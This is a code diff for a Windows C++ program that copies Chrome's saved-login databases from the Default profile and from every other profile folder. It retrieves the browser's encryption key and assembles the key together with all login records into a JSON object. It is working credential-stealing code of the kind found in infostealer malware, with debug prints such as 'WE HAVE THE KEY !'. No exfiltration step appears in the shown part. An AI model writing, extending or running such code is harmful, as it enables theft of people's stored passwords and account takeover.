@@ -125,46 +125,83 @@ json driver(){
         printf("didnt get path\n");
         return -1;
     }
-    //char * a = "\\AppData\\Local\\Google\\Chrome\\User Data\\default\\Login Data";
-    
-    //https://stackoverflow.com/questions/6858524/convert-char-to-lpwstr
-    std::string s = (std::string(lpProfileDir) + std::string("\\AppData\\Local\\Google\\Chrome\\User Data\\profile\\Login Data"));
-   
-    const char * db_path = s.c_str();
-    const char * temp = "ChromeData.db";
-
-   if (!CopyFile(db_path,temp, false)){
-    printf("COPY FILE W FAILED \n");
-    printf("Error: %d\n", GetLastError());
-    return -1;
-   }
     PDATA_BLOB key = (PDATA_BLOB)malloc(sizeof(DATA_BLOB));
     key = GetEncryptionKey();
+    printf("\n");
+    printf("\nWE HAVE THE KEY !\n");
+
+    //char * a = "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data";
+    
+    //https://stackoverflow.com/questions/6858524/convert-char-to-lpwstr
+    std::string s = (std::string(lpProfileDir) + std::string("\\AppData\\Local\\Google\\Chrome\\User Data"));
+    //std::cout << s << " <------- path\n";
+    std::string prof_path;
+    //https://stackoverflow.com/questions/1878001/how-do-i-check-if-a-c-stdstring-starts-with-a-certain-string-and-convert-a
+
+    //do for default
+    json allRes;
+    prof_path = s + std::string("\\Default\\Login Data");
+
+    
+            const char * db_path = prof_path.c_str();
+            const char * temp = "ChromeData.db";
+
+            if (!CopyFile(db_path,temp, false)){
+                printf("COPY FILE W FAILED \n");
+                printf("Error: %d\n", GetLastError());
+                return -1;
+            }
+            printf("\n\n\n-----RES beg------\n\n\n");
+            std::cout << getAllResults(temp);
+            printf("\n\n\n-----RE end------\n\n\n");
+
+            allRes[prof_path] = json(getAllResults(temp));
+
+    std::string prefix = "Profile";
+    //do for all profiles
+    
+    for (const auto& entry : std::filesystem::directory_iterator(s)){
+        //std::cout << "ENTRY ----->    " << entry.path().string() << '\n';
+        //std::cout << prefix << "     " << entry.path().string().substr(s.size() + 1, prefix.size() ) << '\n';
+        if (!prefix.compare(entry.path().string().substr(s.size() + 1, prefix.size()))) {
+            std::cout << entry.path().string() << '\n';
+            prof_path =  entry.path().string() + std::string("\\Login Data");
+
+            const char * db_path = prof_path.c_str();
+
+
+            const char * temp = "ChromeData.db";
+
+            if (!CopyFile(db_path,temp, false)){
+                printf("COPY FILE W FAILED \n");
+                printf("Error: %d\n", GetLastError());
+                return -1;
+            }
+            printf("\n\n\n-----RES beg------\n\n\n");
+            //std::cout << getAllResults(temp);
+            printf("\n\n\n-----RE end------\n\n\n");
+
+            allRes[prof_path] = json(getAllResults(temp));
+        }
+    }
+
+    printf("SHOULD FAIL AFTER HERE\n");
+
+
+    
+
+    /*
     for (DWORD i = 0; i < key->cbData; i++){
         printf("%x", key->pbData[i]);
     }
-    printf("\n");
-    printf("\nWE HAVE THE KEY !\n");
-   sqlite3 *db;
-   char *zErrMsg = 0;
-   const char *data = "QueryRes" ;
-   int rc;
-    //https://www.tutorialspoint.com/sqlite/sqlite_c_cpp.htm
-   rc = sqlite3_open(temp, &db);
-
-   if( rc ) {
-      fprintf(stderr, "Can't open database: %s\n", sqlite3_errmsg(db));
-      return(0);
-   } else {
-      fprintf(stderr, "Opened database successfully\n");
-   }
+    */
+    
    //std::stringstream chrome_pass = get_chrome_pass(key->pbData + 5, db);
    json test;
    test["KEY"] = hexStr(key->pbData, key->cbData);
-   test["RECORDS"] = json(getAllResults(db));
-
-
-   sqlite3_close(db);
+   test["RECORDS"] = allRes;
+   //[path: results]
+   //sqlite3_close(db);
    return 0;
 }
 
